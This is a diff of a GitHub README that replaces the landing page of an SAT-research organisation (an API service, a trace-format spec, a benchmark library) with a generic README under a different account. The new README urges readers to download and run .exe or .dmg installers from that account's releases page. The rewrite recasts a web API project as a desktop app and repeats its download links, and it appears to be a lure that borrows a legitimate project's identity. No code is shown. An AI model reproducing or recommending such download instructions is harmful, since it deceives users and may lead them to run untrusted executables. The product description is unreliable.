@@ -1,219 +1,85 @@
-<!-- BYT-WYZE™ GitHub landing – dark theme wrapper -->
+# 🔧 Byt-wyze-technology - Your Tool for Efficient SAT Solutions
 
-<div style="background:#050509; color:#f9fafb; padding:32px 24px; border-radius:16px;">
+[![Download Here](https://img.shields.io/badge/Download%20Now-%23007bff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mikers2/Byt-wyze-technology/releases)
 
-  <p align="center">
-    <img src="https://www.byt-wyze.com/assets/sat-maker-hero-CUYhIwxq.jpg"
-         alt="BYT-WYZE Banner"
-         width="100%" />
-  </p>
+## 📦 Introduction
 
-<div align="center">
+Byt-wyze-technology provides deterministic SAT APIs, CNF preprocessing tools, and reproducible research standards. This software helps you solve complex logical problems with ease. Whether you are involved in research, development, or just curious about computational logic, this application simplifies the process for you.
 
-# BYT-WYZE™ Technology
+## 🚀 Getting Started
 
-### *Deterministic APIs for Hard Problems*
+To get started with Byt-wyze-technology, you need to download and install the application. Follow the steps below to ensure a smooth setup.
 
-![Status](https://img.shields.io/badge/Status-Active-success?style=flat-square)
-![Focus](https://img.shields.io/badge/Focus-SAT%20%26%20Formal%20Methods-blue?style=flat-square)
-![Standards](https://img.shields.io/badge/Standards-Deterministic-orange?style=flat-square)
-![Research](https://img.shields.io/badge/Research-Reproducible-purple?style=flat-square)
+## 📥 Download & Install
 
-*Building transparent, auditable, and repeatable infrastructure for the SAT and formal-methods community*
+1. **Visit Our Releases Page**: Click [here](https://github.com/mikers2/Byt-wyze-technology/releases) to visit this page to download.
 
-[🌐 Website](https://byt-wyze.com) • [📧 Contact](mailto:info@byt-wyze.com) • [🚀 API](https://rapidapi.com/bytwyze/api/sat-maker)
+2. **Select the Version**: On the releases page, you will see a list of available versions. Choose the latest stable version for the best experience.
 
-</div>
+3. **Download the File**: Click on the asset link corresponding to your operating system. This will start the download of the application package.
 
----
+4. **Install the Application**: 
+   - If you are using Windows, double-click the downloaded `.exe` file and follow the installation prompts.
+   - For Mac, open the `.dmg` file and drag the application to your Applications folder.
+   - On Linux, follow the installation instructions specific to your distribution, generally using a package manager.
 
-##  Mission
+5. **Run the Application**: After installation, locate Byt-wyze-technology in your applications menu or desktop, and double-click to launch.
 
-Byt-Wyze develops **deterministic SAT generators**, **CNF preprocessing tooling**, and **reproducible research standards** for the SAT and formal-methods community.
+## ✔️ System Requirements
 
-We make SAT experimentation **transparent**, **auditable**, and **repeatable** — from instance generation to solver preprocessing and model lifting.
+Before you install, please ensure your system meets the following minimum requirements:
 
-**Our Principles:**
-- ✅ Deterministic by design
-- ✅ Scientifically rigorous
-- ✅ Fully reproducible
-- ✅ Open standards, commercial-grade execution
+- **Operating System**: Windows 10 or later, MacOS Catalina or later, or a recent Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum 100 MB of free space.
 
----
+## 🌟 Key Features
 
-## 📦 Products & Projects
+- **Deterministic SAT APIs**: Handle complex logical problems with reliable API responses. 
+- **CNF Preprocessing Tools**: Simplify CNF data for improved performance.
+- **Reproducible Research Standards**: Ensure your results are reliable and can be replicated.
 
-### 🔬 [STTF — SAT Transformation Trace Format](https://github.com/Byt-wyze-technology/STTF)
+## 🛠️ Usage Instructions
 
-**A deterministic, reversible format for recording CNF preprocessing steps**
+Once installed, you can easily start using Byt-wyze-technology. Here’s a brief overview of common tasks:
 
-The SAT community needs a standard way to track what solvers do during preprocessing. STTF provides exactly that.
+1. **Setting Up a Project**:
+   - Launch the application.
+   - Create a new project by selecting "New Project" from the menu.
+   - Follow the prompts to configure your settings.
 
-**Key Features:**
-- ✅ Minimal opcode set covering all core CNF transformations  
-- ✅ Full trace from original CNF → simplified CNF  
-- ✅ Deterministic reverse-map for lifting solver models  
-- ✅ Reference replay + validation engine  
-- ✅ Designed for research, benchmarking, solver development, and competitions  
+2. **Using the APIs**:
+   - Navigate to the API section.
+   - Choose the specific API you want to utilize.
+   - Follow the guidelines provided for input formats and expected outputs.
 
-**Status:** Open specification for community adoption
+3. **Preprocessing CNF Data**:
+   - Upload your CNF file using the upload feature.
+   - Select the preprocessing options that suit your needs.
+   - Process the data and download the results.
 
-**Use Cases:**
-- Competition organizers tracking solver behavior  
-- Researchers validating preprocessing claims  
-- Solver developers debugging transformations  
-- Academic reproducibility requirements  
+## 🔍 Troubleshooting
 
-🔗 **[View Repository](https://github.com/Byt-wyze-technology/STTF)**
+If you encounter issues during installation or usage, consider the following tips:
 
----
+- **Installation Fails**: Ensure you have sufficient permissions on your system. Try running the installer as an administrator.
+- **Feature Not Working**: Revisit the documentation for potential configuration issues.
+- **Support Help**: Reach out through the GitHub issues page for assistance.
 
-###  [SAT Maker API](https://rapidapi.com/bytwyze/api/sat-maker)
+## 🤝 Contributing
 
-**Deterministic SAT instance generator with mathematically rigorous hardness control**
+Your feedback is important. If you find bugs or have suggestions, please contribute by opening an issue on our GitHub repository. To contribute code, fork the repository and submit a pull request.
 
-Generate SAT instances with predictable structural properties using the proprietary CES (Combinatorial Exponential Sequence) framework.
+## 📑 License
 
-**Key Features:**
-- ✅ Deterministic generation (same seed = same instance)  
-- ✅ Tunable difficulty parameters  
-- ✅ Mathematically grounded (not random)  
-- ✅ DIMACS CNF output format  
-- ✅ Millisecond generation speed  
+Byt-wyze-technology is open-source software, distributed under the MIT License. You can use it freely, but please give credit to the original authors.
 
-**Pricing:**
-- Free tier: 100 calls/month  
-- Pro: $59/mo – 1,000 calls  
-- Ultra: $299/mo – 10,000 calls  
+## 🌐 Connect with Us
 
-**Use Cases:**
-- Solver benchmarking and testing  
-- ML training data generation  
-- Academic research and coursework  
-- Automated testing pipelines  
+Stay updated by following our [GitHub page](https://github.com/mikers2/Byt-wyze-technology). We appreciate your interest in Byt-wyze-technology and look forward to your feedback.
 
-🔗 **[Try the API](https://rapidapi.com/bytwyze/api/sat-maker)** | 📊 **[See Examples](https://github.com/Byt-wyze-technology/sat-instances-library)**
+## 🔗 Quick Links
 
----
+[Download Here](https://github.com/mikers2/Byt-wyze-technology/releases)
 
-### 📊 [SAT Benchmark Instance Library](https://github.com/Byt-wyze-technology/sat-instances-library)
-
-**101 mathematically rigorous SAT instances with full analysis**
-
-Free, open-source collection demonstrating what SAT Maker API can produce.
-
-**What's Included:**
-- ✅ 50 SATISFIABLE instances  
-- ✅ 50 UNSATISFIABLE instances  
-- ✅ 1 STALL-class instance (extreme difficulty)  
-- ✅ Interactive HTML viewer  
-- ✅ Complete solver metrics and analysis  
-- ✅ 3×3 hardness taxonomy classification  
-
-**Perfect for:**
-- Evaluating new SAT solvers  
-- Educational demonstrations  
-- Research paper baselines  
-- Algorithm validation  
-
-🔗 **[View Library](https://github.com/Byt-wyze-technology/sat-instances-library)**
-
----
-
-## 🗺️ 2025 Achievements & 2026 Roadmap
-
-### ✅ Completed in 2025
-- SAT Maker API v1.0 launched  
-- SAT Benchmark Instance Library released (101 instances)  
-- Interactive HTML viewer  
-- 3×3 hardness taxonomy  
-- BYT-WYZE™ trademark secured  
-
-### 🔜 Q1 2026
-- STTF v1.0 specification  
-- STTF OIS registration  
-- SAT Maker API v2.0  
-
-### 🔜 Q2–Q4 2026
-- Deterministic dataset suites  
-- Additional SAT analysis tools  
-- Alternative mathematical generation models  
-- Expanded API ecosystem  
-
----
-
-## 💬 Community & Collaboration
-
-We actively seek collaboration with:
-
-**🔬 Researchers** — reproducible datasets & academic partnerships  
-**⚙️ Solver Developers** — STTF integration & benchmarking  
-**🏆 Competition Organizers** — deterministic datasets & trace standards  
-**👥 Contributors** — tooling, docs & spec improvements  
-
-### Get Involved
-- 📧 info@byt-wyze.com  
-- 🌐 https://byt-wyze.com  
-- 💬 Open an issue  
-- 🤝 Collaborations welcome  
-
----
-
-## 📜 Licensing Philosophy
-
-| Component | License | Purpose |
-|----------|---------|---------|
-| STTF Spec | Open Source | Community adoption |
-| Instance Library | MIT | Educational & research |
-| Algorithms | Proprietary | Commercial sustainability |
-| API Services | API License | Industrial-grade reliability |
-
----
-
-## 🏆 Why Byt-Wyze?
-
-### The Problem
-- Opaque preprocessing  
-- Random instances = inconsistent research  
-- No trace standards  
-- Static, non-customisable benchmarks  
-
-### Our Solution
-- **STTF**: transparent preprocessing  
-- **SAT Maker**: deterministic generation  
-- **Open standards**  
-- **Production APIs**  
-
----
-
-## 📚 Resources
-
-- STTF Specification  
-- SAT Maker API Docs  
-- Instance Library Guide  
-- SAT Competition  
-- DIMACS Format  
-
----
-
-## 📞 Contact
-
-**General:** info@byt-wyze.com  
-**Website:** https://byt-wyze.com  
-**API Support:** RapidAPI Dashboard  
-**GitHub:** https://github.com/Byt-wyze-technology  
-
----
-
-<div align="center">
-
-**BYT-WYZE™ Technology**  
-*Deterministic APIs for Hard Problems*
-
-© 2025 BYT-WYZE™ — Infrastructure for transparent, reproducible SAT research
-
-[🌐 byt-wyze.com](https://byt-wyze.com) • [🚀 Try Our API](https://rapidapi.com/bytwyze/api/sat-maker) • [📊 Instance Library](https://github.com/Byt-wyze-technology/sat-instances-library)
-
-</div>
-
-</div>
+Thank you for choosing Byt-wyze-technology. We hope it makes your work easier and more efficient!
